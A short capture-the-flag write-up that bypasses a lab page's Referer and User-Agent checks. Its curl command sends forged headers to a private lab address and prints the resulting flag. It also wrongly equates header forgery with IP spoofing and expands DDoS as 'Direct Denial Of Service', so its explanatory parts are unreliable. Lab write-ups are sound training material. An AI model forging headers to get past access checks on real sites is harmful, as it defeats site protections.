# Spoof Curl
On this link [http://192.168.8.121/index.php?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c](http://192.168.8.121/index.php?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c) There are comments that are clues to getting a flag the first one 
``` html
<!--
You must cumming from : "https://www.nsa.gov/" to go to the next step
-->
```
The other says 
``` html
<!--
Let's use this browser : "ft_bornToSec". It will help you a lot.
-->
```

## Methods
So we then change the ***referer*** to [https://www.nsa.gov/](https://www.nsa.gov/) and the user-agent to ***ft_bornToSec***.

This can be accomplised using ***Burpsuite*** and ***Curl***.

Using ***Burpsuite*** we can intercept a request and then change the values in the header.

Using ***Curl*** we can have the following command in the terminal.

```bash
curl http://10.203.72.119/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c -H 'Referer:https://www.nsa.gov/' -H 'User-agent:ft_bornToSec' | grep "flag"
```
The output
```html
<h2 style="margin-top:50px;"> The flag is : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> <audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
```

## Issues
Spoofing is dangourous because a hacker can pretend to be someone else by performing ***ip spoofing***. Hacker tend to use this exploit to preform DDOS (Direct Denial Of Service)

## Solution
There are tools, to monitor the network that, try to help detect spoofing.




































